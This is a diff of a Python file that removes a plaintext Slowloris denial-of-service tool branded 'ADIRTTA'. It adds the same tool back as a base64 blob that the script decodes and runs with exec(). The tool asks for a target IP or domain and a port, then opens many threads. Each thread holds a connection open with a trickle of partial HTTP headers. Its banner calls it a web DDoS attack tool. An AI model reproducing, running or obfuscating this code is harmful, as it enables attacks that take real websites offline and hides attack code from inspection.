@@ -1,70 +1,14 @@
-import socket
-import threading
-import time
-import getpass
-import os
-
-# CLEAR
-def clear():
-    os.system('clear')
-
-# Colored ASCII Art for "ADIRTTA" using '|_' style
-def ascii_art_adirtta():
-    print("""
-\033[1;31m             ___    ____  ________  _______________\033[0m
-\033[1;31m            /   |  / __ \/  _/ __ \/_  __/_  __/   |\033[0m
-\033[1;36m           / /| | / / / // // /_/ / / /   / / / /| |    💀 code by adirtta 💀\033[0m
-\033[1;35m          / ___ |/ /_/ // // _, _/ / /   / / / ___ |    THANK YOU FOR USING MY TOOL ❤>\033[0m
-\033[1;32m         /_/  |_/_____/___/_/ |_| /_/   /_/ /_/  |_|    don't copy my tool ☺️🤗\033[0m
-\033[1;34m      A web ddos attack tool. So do not use it for wrong and unethical activities\033[0m
-""")
+#শাওয়া script কি দেখস
+#script paid 
 
 
-# Password authentication function
-def authenticate():
-    password = "ADi"  # The password to access the tool
-    user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
-    if user_password != password:
-        print("\033[1;31mIncorrect password. Exiting...\033[0m")
-        exit()
+import base64
 
+# Base64 encoded content
+encoded_content = '''aW1wb3J0IHNvY2tldAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmltcG9ydCBnZXRwYXNzCmltcG9ydCBvcwoKIyBDTEVBUgpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQoKIyBDb2xvcmVkIEFTQ0lJIEFydCBmb3IgIkFESVJUVEEiIHVzaW5nICd8Xycgc3R5bGUKZGVmIGFzY2lpX2FydF9hZGlydHRhKCk6CiAgICBwcmludCgiIiIKXDAzM1sxOzMxbSAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZdcMDMzWzBtClwwMzNbMTszMW0gICAgICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnSAgIOKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnVwwMzNbMG0KXDAzM1sxOzM2bSAgICAgICAg4paI4paI4pWRICAgICDilojilojilZEgICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZcgICDilojilojilZEg4pigIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKVlyAgXDAzM1swbQpcMDMzWzE7MzZtICAgICAgICDilojilojilZEgICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVnSAgXDAzM1swbQpcMDMzWzE7MzVtICAgICAgICDilZrilojilojilojilojilojilojilZfilZrilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZEgICDilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl1wwMzNbMG0KXDAzM1sxOzMybSAgICAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZDilZ0gICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdXDAzM1swbQpcMDMzWzE7MzJtICAgICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1swbQpcMDMzWzE7MzRtICAgICAgLS0gRGlzdHJpYnV0ZWQgRGVuaWFsIG9mIFNlcnZpY2UgQXR0YWNrIFRvb2wgLS1cMDMzWzBtClwwMzNbMTszM20gICAgICDimqDvuI8gIFVzZSByZXNwb25zaWJseSEgRmxvb2QgeW91ciB0YXJnZXRzIHdpdGggY2F1dGlvbiEg4pqg77iPIFwwMzNbMG0KXDAzM1sxOzM0bSAgICAgICAg8J+SgCBQb3dlcmVkIGJ5IEFESVJUVEEg8J+SgFwwMzNbMG0KXDAzM1sxOzM0bSAgICAgICAgLS0gVGhhbmsgeW91IGZvciB1c2luZyB0aGlzIHRvb2wgLS1cMDMzWzBtCiIiIikKCgojIFBhc3N3b3JkIGF1dGhlbnRpY2F0aW9uIGZ1bmN0aW9uCmRlZiBhdXRoZW50aWNhdGUoKToKICAgIHBhc3N3b3JkID0gIkFEaSIgICMgVGhlIHBhc3N3b3JkIHRvIGFjY2VzcyB0aGUgdG9vbAogICAgdXNlcl9wYXNzd29yZCA9IGdldHBhc3MuZ2V0cGFzcyhwcm9tcHQ9IlwwMzNbMTszNm1FbnRlciB0aGUgcGFzc3dvcmQgdG8gYWNjZXNzIHRoZSB0b29sOiBcMDMzWzBtIikKICAgIGlmIHVzZXJfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CiAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1JbmNvcnJlY3QgcGFzc3dvcmQuIEV4aXRpbmcuLi5cMDMzWzBtIikKICAgICAgICBleGl0KCkKCgojIE9wdGltaXplZCBTbG93bG9yaXMgZnVuY3Rpb24gd2l0aCB0aHJlYWRpbmcgZm9yIGZhc3RlciBleGVjdXRpb24KZGVmIHNsb3dsb3Jpc190aHJlYWQodGFyZ2V0LCBwb3J0KToKICAgIHRyeToKICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHMuc2V0dGltZW91dCg0KQogICAgICAgIHMuY29ubmVjdCgodGFyZ2V0LCBwb3J0KSkKICAgICAgICBzLnNlbmQoZiJHRVQgLz8gSFRUUC8xLjFcclxuSG9zdDoge3RhcmdldH1cclxuVXNlci1BZ2VudDogTW96aWxsYS81LjBcclxuIi5lbmNvZGUoKSkKCiAgICAgICAgIyBGYXN0ZXIgbG9vcCB0byBzZW5kIHBhcnRpYWwgaGVhZGVycwogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHMuc2VuZChiIlgtYTogYlxyXG4iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDEpICAjIEZ1cnRoZXIgcmVkdWNlZCBkZWxheSB0byBtYWtlIGl0IGZhc3RlcgogICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICBwcmludCgiXDAzM1sxOzMxbUNvbm5lY3Rpb24gZXJyb3IuIENvdWxkIG5vdCBzZW5kIGRhdGEuXDAzM1swbSIpCiAgICAgICAgcmV0dXJuCgpkZWYgc2xvd2xvcmlzKHRhcmdldCwgcG9ydCwgbnVtX3RocmVhZHMpOgogICAgZm9yIGkgaW4gcmFuZ2UobnVtX3RocmVhZHMpOgogICAgICAgIHRocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNsb3dsb3Jpc190aHJlYWQsIGFyZ3M9KHRhcmdldCwgcG9ydCkpCiAgICAgICAgdGhyZWFkLnN0YXJ0KCkKICAgICAgICBwcmludChmIlwwMzNbMTszM21TZW50IGxvdmUgbWVzc2FnZSB7aSArIDF9IPCfkoxcMDMzWzBtIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBjbGVhcigpICAjIENsZWFyIHRoZSBzY3JlZW4gYmVmb3JlIHNob3dpbmcgYW55dGhpbmcKICAgIGFzY2lpX2FydF9hZGlydHRhKCkgICMgRGlzcGxheSB0aGUgY29sb3JmdWwgQVNDSUkgYXJ0IGZvciAnQURJUlRUQScKCiAgICBhdXRoZW50aWNhdGUoKSAgIyBBdXRoZW50aWNhdGUgYWZ0ZXIgZGlzcGxheWluZyBBU0NJSSBhcnQKCiAgICB0YXJnZXQgPSBpbnB1dCgiXDAzM1sxOzM2bUVudGVyIHRoZSB0YXJnZXQgSVAgb3IgZG9tYWluOiBcMDMzWzBtIikKICAgIHBvcnQgPSBpbnQoaW5wdXQoIlwwMzNbMTszNm1FbnRlciB0aGUgcG9ydCBudW1iZXI6IFwwMzNbMG0iKSkKICAgIG51bV90aHJlYWRzID0gaW50KGlucHV0KCJcMDMzWzE7MzZtRW50ZXIgdGhlIG51bWJlciBvZiB0aHJlYWRzIChtb3JlID0gZmFzdGVyKTogXDAzM1swbSIpKQoKICAgIHNsb3dsb3Jpcyh0YXJnZXQsIHBvcnQsIG51bV90aHJlYWRzKQoKICAgIHByaW50KGYiXDAzM1sxOzMxbVRoYW5rIHlvdSBmb3IgdXNpbmcgbXkgdG9vbFwwMzNbMG0iKQoKICAgIHByaW50KGYiXDAzM1sxOzMxbW15IGdpdGh1YiBpZDogZ2l0aHViLmNvbS9BRElSVFRBXDAzM1swbSIpCgogICAgcHJpbnQoZiJcMDMzWzE7MzFtcHJlc3MgY3RybCArIHpcMDMzWzBtIikK'''
 
-# Optimized Slowloris function with threading for faster execution
-def slowloris_thread(target, port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(4)
-        s.connect((target, port))
-        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
+# Decode the base64 string
+decoded_content = base64.b64decode(encoded_content).decode('utf-8')
 
-        # Faster loop to send partial headers
-        while True:
-            s.send(b"X-a: b\r\n")
-            time.sleep(0.01)  # Further reduced delay to make it faster
-    except socket.error:
-        print("\033[1;31mConnection error. Could not send data.\033[0m")
-        return
-
-def slowloris(target, port, num_threads):
-    for i in range(num_threads):
-        thread = threading.Thread(target=slowloris_thread, args=(target, port))
-        thread.start()
-        print(f"\033[1;33mSent love message {i + 1} 💌\033[0m")
-
-if __name__ == "__main__":
-    clear()  # Clear the screen before showing anything
-    ascii_art_adirtta()  # Display the colorful ASCII art for 'ADIRTTA'
-
-    authenticate()  # Authenticate after displaying ASCII art
-
-    target = input("\033[1;36mEnter the target IP or domain: \033[0m")
-    port = int(input("\033[1;36mEnter the port number: \033[0m"))
-    num_threads = int(input("\033[1;36mEnter the number of threads (more = faster): \033[0m"))
-
-    slowloris(target, port, num_threads)
-
-    print(f"\033[1;31mThank you for using my tool\033[0m")
-
-    print(f"\033[1;31mmy github id: github.com/ADIRTTA\033[0m")
-
-    print(f"\033[1;31mpress ctrl + z\033[0m")
+# Execute the decoded content directly
+exec(decoded_content)
